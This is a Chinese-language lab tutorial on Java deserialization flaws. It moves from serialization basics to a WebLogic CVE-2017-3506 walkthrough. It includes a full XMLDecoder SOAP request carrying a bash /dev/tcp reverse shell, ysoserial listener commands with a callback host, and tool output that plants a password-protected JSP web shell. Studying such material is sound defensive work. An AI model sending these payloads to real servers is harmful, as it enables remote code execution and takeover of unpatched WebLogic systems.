---
title: Java序列化与反序列化
date: 2022-1-11 11:41:30
updated: 2022-1-11 11:41:30
categories: notebook
tags:
urlname:
keywords: Java反序列化,weblogic
---

#### 1.概念

序列化是让Java对象脱离Java运行环境的一种手段，可以有效的实现多平台之间的通信、对象持久化存储。

序列化与反序列化示例：

```java
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInput;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;

public class test {

	public static void main(String[] args) throws Exception{
		// TODO 自动生成的方法存根
		String obj="hello world!";
		//创建一个包含对象反序列化信息的文件
		FileOutputStream fos=new FileOutputStream("object");
		ObjectOutputStream os=new ObjectOutputStream(fos);
		//writeObject()方法将obj对象写入object文件
		os.writeObject(obj);
		os.close();
		
		//从文件中反序列化obj对象
		FileInputStream fis=new FileInputStream("object");
		ObjectInputStream is=new ObjectInputStream(fis);
		//恢复对象
		String obj2=(String)is.readObject();
		System.out.print(obj2);
		is.close();
		
	    
	}

}
```

运行结果：

![](https://cdn.jsdelivr.net/gh/QJLONG/HUMMER-PIC@master/img/20220107160525.png)

查看object文件发现：**ac ed 00 05**是java序列化内容的特征

![](https://cdn.jsdelivr.net/gh/QJLONG/HUMMER-PIC@master/img/20220107160826.png)

<br>

#### 2.反序列化漏洞成因

序列化和反序列化本身并不存在问题。但当输入的反序列化的数据可被用户控制，那么攻击者即可通过构造恶意输入，让反序列化产生非预期的对象，在此过程中执行构造的任意代码。

```java
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;

public class test {

	public static void main(String[] args) throws Exception{
		// TODO 自动生成的方法存根
		MyObject myobj=new MyObject();
		myobj.name="hummer";
		//创建一个包含对象反序列化信息的文件
		FileOutputStream fos=new FileOutputStream("object");
		ObjectOutputStream os=new ObjectOutputStream(fos);
		//writeObject()方法将obj对象写入object文件
		os.writeObject(myobj);
		os.close();
		
		//从文件中反序列化obj对象
		FileInputStream fis=new FileInputStream("object");
		ObjectInputStream is=new ObjectInputStream(fis);
		//恢复对象
		MyObject myobj2=(MyObject)is.readObject();
		System.out.print(myobj2.name);
		is.close();
		
	    
	}

}

class MyObject implements Serializable{
	public String name;
	//重写readObject()方法
	private void readObject(java.io.ObjectInputStream in) throws IOException,ClassNotFoundException{
		//执行默认的readObject()方法
		in.defaultReadObject();
		//执行打开计算器的命令
		Runtime.getRuntime().exec("calc.exe");
	}
}
```

上述代码，MyObject类中对readObject()方法重写，重写过程中添加了执行calc（计算器）的代码。

![](https://cdn.jsdelivr.net/gh/QJLONG/HUMMER-PIC@master/img/20220107171320.png)

#### 工具Ysoserial

Ysoserial是国外一款安全工具，集合了各种java反序列化payload，下载地址：

https://github.com/frohoff/ysoserial/

使用方法：

1、在公网上选择一个端口进行流量监听：

java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1  'ping -c 2  rce.267hqw.ceye.io'

2、客户端发送payload

python exploit.py 118.89.53.139 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 118.89.53.139  1099 JRMPClient

解释：JRMPListener 是 ysoserial 工具里的其中一个利用模块，作用是通过反序列化，开启当前主机的一个 JRMP Server ，具体的利用过程是，将反序列化数据发送到 Server 中，然后Server 中进行反序列化操作，并开启指定端口，然后在通过 JRMPClient 去发送攻击 payload。

#### 前提知识

##### **1.反射机制**

JAVA反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性；这种动态获取的信息以及动态调用对象的方法的功能称为java语言的反射机制。

##### **2.RMI和JRMP协议**

RMI是Remote Method Invocation的简称，是J2SE的一部分，能够让程序员开发出基于Java的分布式应用。一个RMI对象是一个远程Java对象，可以从另一个Java虚拟机上（甚至跨过网络）调用它的方法，可以像调用本地Java对象的方法一样调用远程对象的方法，使分布在不同的JVM中的对象的外表和行为都像本地对象一样，RMI传输过程都使用序列化和反序列化。RMI目前使用Java远程消息交换协议JRMP（Java Remote Messaging Protocol）进行通信。JRMP协议是专为Java的远程对象制定的协议。

##### **3.T3协议**

WebLogic Server 中的 RMI 通信使用 T3 协议在WebLogic Server和其他 Java程序（包括客户端及其他 WebLogic Server 实例）间传输数据（序列化的类）。由于WebLogic的T3协议和Web协议共用同一个端口，因此只要能访问WebLogic就可利用T3协议实现payload和目标服务器的通信。

<br>

#### 案例：

##### xml decode反序列化RCE——**CVE-2017-3506**

影响版本：

Oracle WebLogic Server10.3.6.0.0 版本

Oracle WebLogic Server12.1.3.0.0 版本

Oracle WebLogic Server12.2.1.1.0 版本

Oracle WebLogic Server12.2.1.2.0 版本

环境：

靶机：CentOS7（192.168.2.101:7001）

监听机器：Windows7（192.168.2.104:1234）

![](https://cdn.jsdelivr.net/gh/QJLONG/HUMMER-PIC@master/img/20220108101419.png)

<br>

漏洞利用：

访问URL：```http://ip:7001/wls-wsat/CoordinatorPortType11```

![](https://cdn.jsdelivr.net/gh/QJLONG/HUMMER-PIC@master/img/20220110094659.png)

访问这个目录,利用burp抓包,修改请求为post,content-type为text/xml,构造如下xml数据并发送

```xml
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: 192.168.2.101:7001
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 642


<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java version="1.4.0" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>bash -i &gt;&amp; /dev/tcp/192.168.2.104/1234 0&gt;&amp;1</string>
</void>
</array>
<void method="start"/></void>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>
```

![](https://cdn.jsdelivr.net/gh/QJLONG/HUMMER-PIC@master/img/20220110115937.png)

反弹shell成功

![](https://cdn.jsdelivr.net/gh/QJLONG/HUMMER-PIC@master/img/20220110120007.png)

<br>

工具利用：

WebLogic Wls-wsat_RCE:

[XHSecurity/Oracle-WebLogic-CVE-2017-10271: Oracle-WebLogic-CVE-2017-10271 (github.com)](https://github.com/XHSecurity/Oracle-WebLogic-CVE-2017-10271)

```
C:\Users\HUMMER\Desktop\Oracle-WebLogic-CVE-2017-10271-master\Oracle-WebLogic-CV
E-2017-10271-master>java -jar WebLogic_Wls-Wsat_RCE_Exp.jar http://192.168.2.101
:7001 test.jsp

[*] Starting exploit...
[*] Sending payloads...
[*] Payloads sent...
[*] Opening shell...
[*] pwned! Go ahead...

[+] http://192.168.2.101:7001/bea_wls_internal/test.jsp?password=secfree&command
=whoami
```



test.jsp在目标上是不存在的，我们执行命令的时候会给我们创建一个可以执行命令的脚本，也就是最下面的

```
http://192.168.2.101:7001/bea_wls_internal/test.jsp?password=secfree&command
=ls
```

![](https://cdn.jsdelivr.net/gh/QJLONG/HUMMER-PIC@master/img/20220110121612.png)

命令执行成功！！

